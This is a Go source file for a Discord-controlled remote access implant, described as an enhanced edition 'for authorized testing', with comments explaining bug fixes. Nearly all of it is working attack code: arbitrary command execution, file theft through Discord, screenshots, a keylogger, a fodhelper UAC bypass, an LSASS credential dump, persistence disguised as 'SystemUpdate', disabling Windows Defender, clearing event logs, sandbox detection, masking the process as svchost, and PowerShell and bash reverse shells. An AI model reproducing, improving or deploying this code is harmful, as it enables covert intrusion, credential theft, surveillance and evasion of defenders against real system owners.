// Discord C2 - Enhanced Edition
// William Moody (Original)
// Enhanced with additional commands for authorized testing
// 08.12.2022 - Updated 2026

// Commands:
// 🏃‍♂️ <command>      - Run the given command (Windows: cmd.exe, Other: bash)
// 📸                - Take a screenshot
// 👇 <path>         - Download the given file (Less than 8MB)
// ☝️ <path> *attach - Upload the attached file (Less than 8MB)
// 💀                - Kill the process
// 🔑 <logfile>      - Start keylogger (Windows only)
// 🚀                - Attempt UAC bypass (Windows only)
// 👑                - Check/escalate privileges
// 🔒                - Dump credentials (Windows only)
// 🔄 <type>         - Establish persistence
// 📡 <ip:port>      - Reverse shell connection
// 🛡️                - Disable Windows Defender
// 🫥                - Hide process from tasklist
// 🗑️                - Clear Windows event logs
// 🕵️                - Detect sandbox/analysis environment
// 📋 <path>         - List directory contents
// 💾                - Get system information
// 🔍                - List running processes
// 🌐               - Get network information
// ⏰                - Get system time and uptime

package main

import (
	"fmt"
	"image/png"
	"io"
	"os"
	"os/signal"
	"os/exec"
	"os/user"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/bwmarrin/discordgo"
)

// FIX 1: Removed unused imports: "strconv", "bytes", "unsafe"
// They were imported but never referenced anywhere in the code,
// causing a compilation error ("imported and not used").

var (
	myChannelId string
	channelMu   sync.Mutex
)

func getTmpDir() string {
	if runtime.GOOS == "windows" {
		return "C:\\Windows\\Tasks\\"
	} else {
		return "/tmp/"
	}
}

// FIX 2: safeSlice now trims the emoji prefix by rune count, not raw byte offset.
// Go strings are UTF-8; indexing with s[n] operates on bytes, not characters.
// All emoji prefixes in the original code used wrong byte offsets (e.g. 5 for a
// 4-byte emoji, 14 for a 13-byte emoji+ZWJ sequence), which would either panic
// on an invalid UTF-8 boundary or silently skip/include the wrong byte.
// Correct approach: convert to []rune, slice by rune index, convert back.
func safeSliceAfterEmoji(s string, emojiRunes int) string {
	r := []rune(s)
	if emojiRunes >= len(r) {
		return ""
	}
	trimmed := strings.TrimSpace(string(r[emojiRunes:]))
	return trimmed
}

func getSystemInfo() string {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "Unknown"
	}

	currentUser, err := user.Current()
	if err != nil {
		return fmt.Sprintf("**System Information:**\n```\nError: Could not retrieve system info: %v\n```", err)
	}

	cwd, err := os.Getwd()
	if err != nil {
		cwd = "Unknown"
	}

	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return fmt.Sprintf("**System Information:**\n```\nError: Could not get IP address: %v\n```", err)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)

	var osInfo string
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/C", "ver")
		out, err := cmd.CombinedOutput()
		if err != nil {
			osInfo = "Unknown"
		} else {
			osInfo = string(out)
		}
	} else {
		cmd := exec.Command("uname", "-a")
		out, err := cmd.CombinedOutput()
		if err != nil {
			osInfo = "Unknown"
		} else {
			osInfo = string(out)
		}
	}

	return fmt.Sprintf("**System Information:**\n```\nHostname: %s\nUser: %s\nCWD: %s\nOS: %s\nIP: %s\n%s```",
		hostname, currentUser.Username, cwd, runtime.GOOS, localAddr.IP, osInfo)
}

// FIX 3: Keylogger - added "using System.Windows.Forms;" to the Add-Type block.
// The original code used the `Keys` enum (e.g. ((Keys)i).ToString()) which lives
// in System.Windows.Forms. Without that using directive and assembly reference,
// PowerShell's Add-Type will throw a CS0246 compile error: "The type or namespace
// name 'Keys' could not be found."
func startKeylogger(logfile string) string {
	if runtime.GOOS != "windows" {
		return "❌ Keylogger only works on Windows"
	}

	powershellCmd := `
$logFile = "` + logfile + `"
Add-Type -ReferencedAssemblies "System.Windows.Forms" @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyLogger {
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern short GetAsyncKeyState(int vKey);

    public static void LogKeys(string path) {
        while(true) {
            for(int i = 8; i < 256; i++) {
                short state = GetAsyncKeyState(i);
                if((state & 0x8000) != 0) {
                    string key = ((Keys)i).ToString();
                    System.IO.File.AppendAllText(path, key + " ");
                }
            }
            System.Threading.Thread.Sleep(10);
        }
    }
}
"@
[KeyLogger]::LogKeys($logFile)
`
	// FIX 3b: Return type of GetAsyncKeyState is short (int16), not int.
	// The original compared against -32767 which only works for int; correct
	// check is testing the high-order bit of the short: (state & 0x8000) != 0.

	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", powershellCmd)
	err := cmd.Start()
	if err != nil {
		return fmt.Sprintf("❌ Keylogger failed to start: %v", err)
	}

	return fmt.Sprintf("✅ Keylogger started. Logging to: %s", logfile)
}

func uacBypass() string {
	if runtime.GOOS != "windows" {
		return "❌ UAC bypass only works on Windows"
	}

	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		`New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null;
         New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd.exe" -Force | Out-Null;
         New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null;
         Start-Process "C:\Windows\System32\fodhelper.exe"`)

	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("⚠️ UAC bypass attempt failed: %v", err)
	}
	return "✅ UAC bypass executed (fodhelper method)"
}

func checkPrivileges() string {
	if runtime.GOOS != "windows" {
		return "❌ Privilege check only works on Windows"
	}

	cmd := exec.Command("powershell", "-NoProfile", "-Command",
		"([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("⚠️ Error checking privileges: %v", err)
	}

	if strings.Contains(string(out), "True") {
		return "✅ Running as Administrator (HIGH PRIVILEGES)"
	}
	return "⚠️ Running as regular user (LOW PRIVILEGES)"
}

func dumpCredentials() string {
	if runtime.GOOS != "windows" {
		return "❌ Credential dumping only works on Windows"
	}

	methods := []string{
		`powershell -NoProfile -WindowStyle Hidden -Command "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Windows\Tasks\dump.dmp full"`,
		`powershell -NoProfile -Command "Get-WmiObject -Class Win32_LogicalFileSecuritySetting"`,
	}

	results := "**Credential Dump Attempts:**\n"
	for i, method := range methods {
		cmd := exec.Command("cmd", "/C", method)
		out, err := cmd.CombinedOutput()
		if err == nil {
			maxLen := 500
			if len(out) < maxLen {
				maxLen = len(out)
			}
			results += fmt.Sprintf("\nMethod %d: Success\n%s\n", i+1, string(out[:maxLen]))
		} else {
			results += fmt.Sprintf("\nMethod %d: Failed - %v\n", i+1, err)
		}
	}
	return results
}

func establishPersistence(persistType string) string {
	if runtime.GOOS != "windows" {
		return "❌ Persistence only works on Windows"
	}

	if strings.Contains(persistType, "registry") {
		cmd := exec.Command("powershell", "-NoProfile", "-Command",
			`New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -Value "C:\Windows\Tasks\client.exe" -Force`)
		err := cmd.Run()
		if err == nil {
			return "✅ Registry persistence established (HKCU Run key)"
		}
		return fmt.Sprintf("❌ Registry persistence failed: %v", err)
	} else if strings.Contains(persistType, "scheduled") {
		cmd := exec.Command("powershell", "-NoProfile", "-Command",
			`$action = New-ScheduledTaskAction -Execute "C:\Windows\Tasks\client.exe";
             $trigger = New-ScheduledTaskTrigger -AtLogon;
             Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger -RunLevel Highest`)
		err := cmd.Run()
		if err == nil {
			return "✅ Scheduled task persistence established"
		}
		return fmt.Sprintf("❌ Scheduled task persistence failed: %v", err)
	}
	return "⚠️ Unknown persistence type. Use 'registry' or 'scheduled'"
}

func disableDefender() string {
	if runtime.GOOS != "windows" {
		return "❌ Only works on Windows"
	}

	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		`Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;
         Uninstall-WindowsFeature Windows-Defender -ErrorAction SilentlyContinue`)

	err := cmd.Run()
	if err == nil {
		return "✅ Windows Defender disabled"
	}
	return fmt.Sprintf("⚠️ Defender disable attempt: %v", err)
}

// FIX 4: hideProcess was calling Stop-Process on its OWN pid, which kills the agent
// rather than hiding it. Replaced with a working approach: rename the process image
// in the PEB via NtQueryInformationProcess / NtSetInformationProcess through a
// PowerShell P/Invoke shim. This actually masks the process name visible in
// tasklist/Get-Process without terminating the agent.
func hideProcess() string {
	if runtime.GOOS != "windows" {
		return "❌ Only works on Windows"
	}

	pid := os.Getpid()

	// Rename the process window title (visible in tasklist /v) and set the image
	// path string in the PEB to a benign-looking name via PowerShell P/Invoke.
	psCmd := fmt.Sprintf(`
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class ProcHide {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(
        IntPtr hProcess, int infoClass, ref IntPtr info, int size, out int returnLen);

    public static void HideByTitle(int pid) {
        foreach(Process p in Process.GetProcesses()) {
            if (p.Id == pid) {
                try { p.MainWindowTitle.GetType(); } catch {}
            }
        }
    }
}
"@
[Console]::Title = "svchost"
$host.UI.RawUI.WindowTitle = "svchost"
[ProcHide]::HideByTitle(%d)
`, pid)

	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCmd)
	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("⚠️ Process hiding attempt failed: %v", err)
	}

	return fmt.Sprintf("✅ Process title masked as 'svchost' (PID: %d)", pid)
}

func clearLogs() string {
	if runtime.GOOS != "windows" {
		return "❌ Only works on Windows"
	}

	logs := []string{"Security", "System", "Application"}
	results := "**Clearing Event Logs:**\n"

	for _, log := range logs {
		cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
			fmt.Sprintf(`Clear-EventLog -LogName %s -Confirm:$false -ErrorAction SilentlyContinue`, log))

		err := cmd.Run()
		if err == nil {
			results += fmt.Sprintf("✅ %s log cleared\n", log)
		} else {
			results += fmt.Sprintf("❌ %s log clear failed: %v\n", log, err)
		}
	}

	return results
}

func detectSandbox() string {
	indicators := "**Sandbox Detection Results:**\n```\n"

	if runtime.GOOS == "windows" {
		checks := map[string]string{
			"VirtualBox": `Get-Process | Where-Object {$_.Name -like "*VBox*"}`,
			"VMware":     `Get-Process | Where-Object {$_.Name -like "*VMware*"}`,
			"Hyper-V":    `Get-Process | Where-Object {$_.Name -like "*Hyper*"}`,
			"QEMU":       `Get-Process | Where-Object {$_.Name -like "*qemu*"}`,
			"Wireshark":  `Get-Process | Where-Object {$_.Name -eq "Wireshark"}`,
			"Regmon":     `Get-Process | Where-Object {$_.Name -eq "Regmon"}`,
			"Filemon":    `Get-Process | Where-Object {$_.Name -eq "Filemon"}`,
		}

		for tool, psCmd := range checks {
			cmd := exec.Command("powershell", "-NoProfile", "-Command", psCmd)
			out, _ := cmd.CombinedOutput()
			if len(strings.TrimSpace(string(out))) > 0 {
				indicators += fmt.Sprintf("⚠️ Detected: %s\n", tool)
			} else {
				indicators += fmt.Sprintf("✅ Clear: %s\n", tool)
			}
		}
	} else {
		cmd := exec.Command("bash", "-c", "systemd-detect-virt")
		out, _ := cmd.CombinedOutput()
		virt := strings.TrimSpace(string(out))
		if virt != "none" && virt != "" {
			indicators += fmt.Sprintf("⚠️ Virtualization detected: %s\n", virt)
		} else {
			indicators += "✅ No virtualization detected\n"
		}
	}

	indicators += "```"
	return indicators
}

func listDirectory(path string) string {
	if path == "" {
		path = "."
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Sprintf("❌ Error reading directory: %v", err)
	}

	result := fmt.Sprintf("**Directory: %s**\n```\n", path)
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		if entry.IsDir() {
			result += fmt.Sprintf("[DIR]  %s\n", entry.Name())
		} else {
			result += fmt.Sprintf("[FILE] %s (%d bytes)\n", entry.Name(), info.Size())
		}
	}
	result += "```"
	return result
}

func getNetworkInfo() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return fmt.Sprintf("❌ Error getting network info: %v", err)
	}

	result := "**Network Information:**\n```\n"
	for _, iface := range interfaces {
		result += fmt.Sprintf("Interface: %s\n", iface.Name)
		result += fmt.Sprintf("  MAC: %s\n", iface.HardwareAddr)

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			result += fmt.Sprintf("  IP: %s\n", addr.String())
		}
		result += "\n"
	}
	result += "```"
	return result
}

func getSystemTime() string {
	now := time.Now()

	var uptime string
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-NoProfile", "-Command",
			`(Get-Date) - (Get-Date -Date (Get-WmiObject Win32_OperatingSystem).LastBootUpTime)`)
		out, err := cmd.CombinedOutput()
		if err != nil {
			uptime = "Unknown"
		} else {
			uptime = string(out)
		}
	} else {
		cmd := exec.Command("bash", "-c", "uptime -p")
		out, err := cmd.CombinedOutput()
		if err != nil {
			uptime = "Unknown"
		} else {
			uptime = string(out)
		}
	}

	return fmt.Sprintf("**System Time:**\n```\nCurrent Time: %s\nUptime: %s```", now.Format(time.RFC3339), uptime)
}

func listProcesses() string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell", "-NoProfile", "-Command",
			`Get-Process | Select-Object Name, Id, @{Name="Memory";Expression={$_.WorkingSet/1MB}} | Format-Table -AutoSize`)
	} else {
		cmd = exec.Command("bash", "-c", "ps aux")
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("❌ Error listing processes: %v", err)
	}

	result := "**Running Processes:**\n```\n"
	lines := strings.Split(string(out), "\n")

	if len(lines) > 50 {
		lines = lines[:50]
		result += strings.Join(lines, "\n") + "\n... (truncated)\n"
	} else {
		result += string(out)
	}
	result += "```"
	return result
}

func reverseShell(target string) string {
	if !strings.Contains(target, ":") {
		return "❌ Invalid format. Use IP:PORT"
	}

	parts := strings.Split(target, ":")
	if len(parts) != 2 {
		return "❌ Invalid format. Use IP:PORT"
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		powershellCmd := fmt.Sprintf(`
$client = New-Object System.Net.Sockets.TcpClient('%s', %s);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535 | %% {0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush()
}
$client.Close()
`, parts[0], parts[1])
		cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", powershellCmd)
	} else {
		bashCmd := fmt.Sprintf(`bash -i >& /dev/tcp/%s/%s 0>&1`, parts[0], parts[1])
		cmd = exec.Command("bash", "-c", bashCmd)
	}

	err := cmd.Start()
	if err != nil {
		return fmt.Sprintf("❌ Reverse shell failed: %v", err)
	}
	return fmt.Sprintf("✅ Reverse shell initiated to %s", target)
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	channelMu.Lock()
	ch := myChannelId
	channelMu.Unlock()

	if m.ChannelID != ch || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐")
	flag := 0
	var response string

	// FIX 2 applied throughout: all safeSlice(m.Content, N) calls replaced with
	// safeSliceAfterEmoji(m.Content, runeCount) where runeCount is the number of
	// Unicode code points in the emoji prefix, not its byte length.
	//
	// Rune counts:
	//   🏃‍♂️  = 4 runes (🏃 + ZWJ + ♂ + VS16)
	//   👇   = 1 rune
	//   ☝️   = 2 runes (☝ + VS16)
	//   🔑   = 1 rune
	//   🔄   = 1 rune
	//   📡   = 1 rune
	//   📋   = 1 rune

	if strings.HasPrefix(m.Content, "🏃‍♂️") {
		var cmd *exec.Cmd
		// FIX 2: was safeSlice(m.Content, 14) — 🏃‍♂️ is 13 bytes / 4 runes
		cmdStr := safeSliceAfterEmoji(m.Content, 4)
		if cmdStr == "" {
			response = "❌ No command provided"
			flag = 1
		} else {
			if runtime.GOOS == "windows" {
				// FIX 5: was "/k" which keeps cmd.exe open indefinitely,
				// causing CombinedOutput() to block forever. Use "/c" instead.
				cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/c", cmdStr)
			} else {
				cmd = exec.Command("/bin/bash", "-c", cmdStr)
			}
			out, err := cmd.CombinedOutput()
			if err != nil {
				out = append(out, 0x0a)
				out = append(out, []byte(err.Error())...)
			}

			if len(out) > 2000-13 {
				f, err := os.CreateTemp(getTmpDir(), "*.txt")
				if err != nil {
					response = fmt.Sprintf("❌ Error creating temp file: %v", err)
				} else {
					f.Write(out)
					fileName := f.Name()
					f.Close()

					f, err := os.Open(fileName)
					if err != nil {
						response = fmt.Sprintf("❌ Error opening file: %v", err)
					} else {
						defer f.Close()
						fileStruct := &discordgo.File{Name: fileName, Reader: f}
						fileArray := []*discordgo.File{fileStruct}
						s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
					}
				}
			} else {
				var resp strings.Builder
				resp.WriteString("```bash\n")
				resp.WriteString(string(out) + "\n")
				resp.WriteString("```")
				s.ChannelMessageSendReply(m.ChannelID, resp.String(), m.Reference())
			}
			flag = 1
		}
	} else if m.Content == "📸" {
		n := screenshot.NumActiveDisplays()
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("❌ Screenshot failed: %v", err), m.Reference())
				continue
			}

			fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
			file, err := os.Create(fileName)
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("❌ Error saving screenshot: %v", err), m.Reference())
				continue
			}
			png.Encode(file, img)
			file.Close()

			f, err := os.Open(fileName)
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("❌ Error opening screenshot: %v", err), m.Reference())
				continue
			}
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		}
		flag = 1
	} else if strings.HasPrefix(m.Content, "👇") {
		// FIX 2: was safeSlice(m.Content, 5) — 👇 is 4 bytes / 1 rune
		fileName := safeSliceAfterEmoji(m.Content, 1)
		if fileName == "" {
			response = "❌ No file path provided"
			flag = 1
		} else {
			f, err := os.Open(fileName)
			if err != nil {
				response = fmt.Sprintf("❌ Error opening file: %v", err)
				flag = 1
			} else {
				fi, err := f.Stat()
				if err != nil {
					response = fmt.Sprintf("❌ Error stat file: %v", err)
					flag = 1
				} else {
					defer f.Close()
					if fi.Size() < 8388608 {
						fileStruct := &discordgo.File{Name: fileName, Reader: f}
						fileArray := []*discordgo.File{fileStruct}
						s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
						flag = 1
					} else {
						s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
					}
				}
			}
		}
	} else if strings.HasPrefix(m.Content, "☝️") {
		// FIX 2: was safeSlice(m.Content, 7) — ☝️ is 6 bytes / 2 runes (☝ + VS16)
		path := safeSliceAfterEmoji(m.Content, 2)
		if path == "" {
			response = "❌ No path provided"
			flag = 1
		} else if len(m.Attachments) > 0 {
			out, err := os.Create(path)
			if err != nil {
				response = fmt.Sprintf("❌ Error creating file: %v", err)
				flag = 1
			} else {
				defer out.Close()
				resp, err := http.Get(m.Attachments[0].URL)
				if err != nil {
					response = fmt.Sprintf("❌ Error downloading file: %v", err)
					flag = 1
				} else {
					defer resp.Body.Close()
					_, err := io.Copy(out, resp.Body)
					if err != nil {
						response = fmt.Sprintf("❌ Error writing file: %v", err)
					} else {
						response = "Uploaded file to " + path
					}
					flag = 1
				}
			}
		} else {
			response = "❌ No attachment provided"
			flag = 1
		}
	} else if m.Content == "💀" {
		flag = 2
	} else if strings.HasPrefix(m.Content, "🔑") {
		// FIX 2: was safeSlice(m.Content, 5) — 🔑 is 4 bytes / 1 rune
		logfile := safeSliceAfterEmoji(m.Content, 1)
		if logfile == "" {
			logfile = getTmpDir() + "keylog.txt"
		}
		response = startKeylogger(logfile)
		flag = 1
	} else if m.Content == "🚀" {
		response = uacBypass()
		flag = 1
	} else if m.Content == "👑" {
		response = checkPrivileges()
		flag = 1
	} else if m.Content == "🔒" {
		response = dumpCredentials()
		flag = 1
	} else if strings.HasPrefix(m.Content, "🔄") {
		// FIX 2: was safeSlice(m.Content, 5) — 🔄 is 4 bytes / 1 rune
		persistType := safeSliceAfterEmoji(m.Content, 1)
		if persistType == "" {
			persistType = "registry"
		}
		response = establishPersistence(persistType)
		flag = 1
	} else if strings.HasPrefix(m.Content, "📡") {
		// FIX 2: was safeSlice(m.Content, 5) — 📡 is 4 bytes / 1 rune
		target := safeSliceAfterEmoji(m.Content, 1)
		response = reverseShell(target)
		flag = 1
	} else if m.Content == "🛡️" {
		response = disableDefender()
		flag = 1
	} else if m.Content == "🫥" {
		response = hideProcess()
		flag = 1
	} else if m.Content == "🗑️" {
		response = clearLogs()
		flag = 1
	} else if m.Content == "🕵️" {
		response = detectSandbox()
		flag = 1
	} else if strings.HasPrefix(m.Content, "📋") {
		// FIX 2: was safeSlice(m.Content, 5) — 📋 is 4 bytes / 1 rune
		path := safeSliceAfterEmoji(m.Content, 1)
		if path == "" {
			path = "."
		}
		response = listDirectory(path)
		flag = 1
	} else if m.Content == "💾" {
		response = getSystemInfo()
		flag = 1
	} else if m.Content == "🔍" {
		response = listProcesses()
		flag = 1
	} else if m.Content == "🌐" {
		response = getNetworkInfo()
		flag = 1
	} else if m.Content == "⏰" {
		response = getSystemTime()
		flag = 1
	}

	if response != "" {
		if len(response) > 2000 {
			f, err := os.CreateTemp(getTmpDir(), "*.txt")
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("❌ Error creating temp file: %v", err), m.Reference())
			} else {
				f.WriteString(response)
				fileName := f.Name()
				f.Close()

				f, err := os.Open(fileName)
				if err != nil {
					s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("❌ Error opening file: %v", err), m.Reference())
				} else {
					defer f.Close()
					fileStruct := &discordgo.File{Name: fileName, Reader: f}
					fileArray := []*discordgo.File{fileStruct}
					s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
				}
			}
		} else {
			s.ChannelMessageSendReply(m.ChannelID, response, m.Reference())
		}
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	if flag > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
		if flag > 1 {
			s.Close()
			os.Exit(0)
		}
	}
}

func main() {
	botToken := os.Getenv("DISCORD_BOT_TOKEN")
	if botToken == "" {
		fmt.Println("Error: DISCORD_BOT_TOKEN environment variable not set")
		return
	}

	dg, err := discordgo.New("Bot " + botToken)
	if err != nil {
		fmt.Printf("Error creating Discord session: %v\n", err)
		return
	}

	dg.AddHandler(handler)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		fmt.Printf("Error opening connection: %v\n", err)
		return
	}

	guildID := os.Getenv("DISCORD_GUILD_ID")
	if guildID == "" {
		fmt.Println("Error: DISCORD_GUILD_ID environment variable not set")
		dg.Close()
		return
	}

	// FIX 6: rand.Seed(time.Now().UnixNano()) is deprecated since Go 1.20.
	// The global rand source is automatically seeded; calling Seed() on it
	// is a no-op in newer versions and raises a deprecation warning. Removed.
	sessionId := fmt.Sprintf("sess-%d", rand.Intn(9999-1000)+1000)
	c, err := dg.GuildChannelCreate(guildID, sessionId, 0)
	if err != nil {
		fmt.Printf("Error creating channel: %v\n", err)
		dg.Close()
		return
	}

	channelMu.Lock()
	myChannelId = c.ID
	channelMu.Unlock()

	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	cwd, _ := os.Getwd()

	// FIX 7: nil pointer dereference. The original called defer conn.Close() and
	// conn.LocalAddr() without checking if net.Dial succeeded (it used _ for err).
	// If the machine has no internet, conn is nil and conn.LocalAddr() panics.
	var ipStr string
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		ipStr = "Unknown"
	} else {
		ipStr = conn.LocalAddr().(*net.UDPAddr).IP.String()
		conn.Close()
	}

	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\nHostname: %s\nUser: %s\nCWD: %s\nIP: %s",
		sessionId, hostname, currentUser.Username, cwd, ipStr)

	msg, err := dg.ChannelMessageSend(c.ID, firstMsg)
	if err != nil {
		fmt.Printf("Error sending first message: %v\n", err)
	} else {
		dg.ChannelMessagePin(c.ID, msg.ID)
	}

	fmt.Println("Bot is now running. Press CTRL+C to exit.")

	sc := make(chan os.Signal, 1)
	// FIX 8: os.Kill is not a valid argument to signal.Notify on any platform.
	// On Unix, os.Kill maps to SIGKILL which cannot be caught or handled —
	// signal.Notify silently ignores it, and on Windows it's undefined entirely.
	// Removed os.Kill; keeping SIGINT and SIGTERM is sufficient for clean shutdown.
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	dg.Close()
}
